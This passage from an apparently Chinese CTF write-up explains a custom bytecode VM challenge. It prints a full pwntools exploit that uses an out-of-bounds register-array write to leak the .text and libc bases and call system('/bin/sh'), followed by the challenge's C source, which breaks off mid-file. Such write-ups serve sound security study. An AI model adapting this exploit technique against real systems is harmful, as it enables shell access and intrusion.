class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">payload3=<span class="hljs-string">b&quot;&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((system_addr&amp;<span class="hljs-number">0xffff</span>)).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x60\x00&quot;</span>+(puts_f_addr_r-sysmm_addr_r).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((system_addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((system_addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+(abinsh_addr&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x60\x00\x00\x00&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((abinsh_addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((abinsh_addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x2c&quot;</span>+((sysmm_addr_r-ra_addr_r)//<span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这段代码现将计算得到的 <code>system</code> 函数地址写入<code>0x2c</code> 指令所在地址，在调用该函数，实现 <code>getshell</code>。这里同样利用了和 <code>payload2</code>一样的<strong>数组越界漏洞</strong>（<code>ra</code>数组）</p><p>下面是完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ip=<span class="hljs-string">&#x27;test ip&#x27;</span>     <span class="hljs-comment"># test ip</span><br>port=<span class="hljs-number">9999</span>           <span class="hljs-comment"># test port</span><br>conn=connect(ip,port)<br><br>libc=ELF(<span class="hljs-string">&quot;/home/kali/ctf/task/VM/virtual_machine/src/libc.so.6&quot;</span>)    <span class="hljs-comment">#load libc</span><br><br>system_libc=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>putchar_libc=libc.sym[<span class="hljs-string">&#x27;putchar&#x27;</span>]<br>abinsh_libc=libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>puts_plt_r=<span class="hljs-number">0x00000000000010D0</span><br>putchar_got_r=<span class="hljs-number">0x0000000000005018</span><br>nop_addr_r=<span class="hljs-number">0x0000000000001D1D</span><br>nop_f_addr_r=<span class="hljs-number">0x0000000000007490</span><br>sysmm_addr_r=<span class="hljs-number">0x0000000000005100</span><br>ra_addr_r=<span class="hljs-number">0x0000000000005080</span><br>puts_f_addr_r=<span class="hljs-number">0x7560</span>    <span class="hljs-comment"># where we want puts&#x27; address to be stored</span><br><br><br><span class="hljs-comment"># leak .text base address</span><br>payload1=<span class="hljs-string">b&quot;&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x60\x00\x08\x00&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+(nop_f_addr_r-sysmm_addr_r).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload1+=<span class="hljs-string">b&quot;\x28\x01&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x29\x01&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x11&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x48\x00\x02&quot;</span><br>payload1+=<span class="hljs-string">b&quot;\x81\x08&quot;</span><br><br>conn.recvline()<br>conn.recvline()<br>conn.recvline()<br>conn.sendline(payload1)<br><br>nop_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recvline()[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>text_base=nop_addr-nop_addr_r<br><br><br>putchar_got=putchar_got_r+text_base<br>puts_plt=puts_plt_r+text_base<br><br><br><span class="hljs-comment"># leak libc base</span><br>payload2=<span class="hljs-string">b&quot;&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((puts_plt&amp;<span class="hljs-number">0xffff</span>)).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x60\x00&quot;</span>+(puts_f_addr_r-sysmm_addr_r).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((puts_plt&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((puts_plt&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+(putchar_got&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x60\x00\x00\x00&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((putchar_got&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((putchar_got&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload2+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload2+=<span class="hljs-string">b&quot;\x2c&quot;</span>+((sysmm_addr_r-ra_addr_r)//<span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>conn.sendline(payload2)<br>putchar_addr=<span class="hljs-built_in">int</span>.from_bytes(conn.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>libcbase=putchar_addr-putchar_libc<br>system_addr=libcbase+system_libc<br>abinsh_addr=libcbase+abinsh_libc<br><br><span class="hljs-comment"># system(&quot;/bin/sh&quot;)</span><br>payload3=<span class="hljs-string">b&quot;&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((system_addr&amp;<span class="hljs-number">0xffff</span>)).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x60\x00&quot;</span>+(puts_f_addr_r-sysmm_addr_r).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((system_addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((system_addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+(abinsh_addr&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x60\x00\x00\x00&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((abinsh_addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x10\x10&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x60\x01&quot;</span>+((abinsh_addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>).to_bytes(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>payload3+=<span class="hljs-string">b&quot;\x45\x00\x01&quot;</span><br>payload3+=<span class="hljs-string">b&quot;\x2c&quot;</span>+((sysmm_addr_r-ra_addr_r)//<span class="hljs-number">8</span>).to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br>conn.recvuntil(<span class="hljs-string">&quot;---your code---\n&quot;</span>)<br>conn.sendline(payload3)<br>conn.interactive()<br></code></pre></td></tr></table></figure><h2 id="程序源码">程序源码</h2><p><code>vm.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;operator.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;registers.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN(x,y) (((x)&lt;(y))?(x):(y))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf,<span class="hljs-type">uint8_t</span> buf_size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; RNUM; i++)<br>    &#123;<br>        *(ra[i])=<span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-built_in">memset</span>((<span class="hljs-type">char</span>*)&amp;sysmm,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(sysmm));<br>    load_ftable();<br>    load_text(buf,MIN(buf_size,<span class="hljs-keyword">sizeof</span>(sysmm.text)));<br>    exec_text();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span><br>&#123;<br>    <span class="hljs-comment">// char ii[2]=&#123;0x1,0x2&#125;;</span><br>    <span class="hljs-comment">// vm_init();</span><br>    <span class="hljs-comment">// vm_process(ii);</span><br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">char</span> code[]=<span class="hljs-string">&quot;\x60\x01he\x60\x00\x00\x02\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01ll\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01o\x0a\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x02\x00\x02\x49\x00\x02\x28\x02\x11\x29\x02\x48\x00\x03\x81\x26\x10\x11&quot;</span>;<br>    <br>    exec(code,<span class="hljs-keyword">sizeof</span>(code));<br>    <span class="hljs-comment">// load_ftable();</span><br>    <span class="hljs-comment">// load_text(code,MIN(sizeof(code),sizeof(sysmm.text)));</span><br>    <span class="hljs-comment">// exec_text();</span><br><br><br>    <span class="hljs-type">char</span> code2[]=<span class="hljs-string">&quot;\x60\x01\x61\x6e\x60\x00\x00\x02\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x64\x20\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x68\x6f\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x77\x20\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x74\x6f\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x20\x70\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x72\x6f\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x67\x72\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x61\x6d\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x01\x3f\x0a\x45\x00\x01\x10\x10&quot;</span><br>    <span class="hljs-string">&quot;\x60\x02\x00\x02\x49\x00\x02&quot;</span><br>    <span class="hljs-string">&quot;\x28\x02\x11\x29\x02\x48\x00\x03\x81\x65\x00&quot;</span>;<br><br>    exec(code2,<span class="hljs-keyword">sizeof</span>(code2));<br><br>    <span class="hljs-type">char</span> your_code[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;---your code---&quot;</span>);<br>        fgets(your_code,<span class="hljs-number">256</span>,<span class="hljs-built_in">stdin</span>);<br>        exec(your_code,<span class="hljs-number">255</span>);<br>    &#125;<br>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>registers.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;registers.h&quot;</span></span><br><br><span class="hljs-type">uint16_t</span> r0=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r1=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r2=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r3=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r4=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r5=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r6=<span class="hljs-number">0</span>;<br><span class="hljs-type">uint16_t</span> r7=<span class="hljs-number">0</span>;<br><br><span class="hljs-type">uint16_t</span>* ra[RNUM]=&#123;&amp;r0,&amp;r1,&amp;r2,&amp;r3,&amp;r4,&amp;r5,&amp;r6,&amp;r7&#125;;<br></code></pre></td></tr></table></figure><p><code>registers.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> REGISTERS_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REGISTERS_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R(i) (r##i)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RNUM 8</span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r0;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r1;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r2;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r3;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r4;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r5;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r6;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span> r7;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">uint16_t</span>* ra[RNUM];<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p><code>operator.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;operator.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;registers.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">inc0</span><span class="hljs-params">()</span>&#123;<br>    r0++;<br>    r6++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dec0</span><span class="hljs-params">()</span>&#123;<br>    r0--;<br>    r6++;<br>&#125;<br><br><span 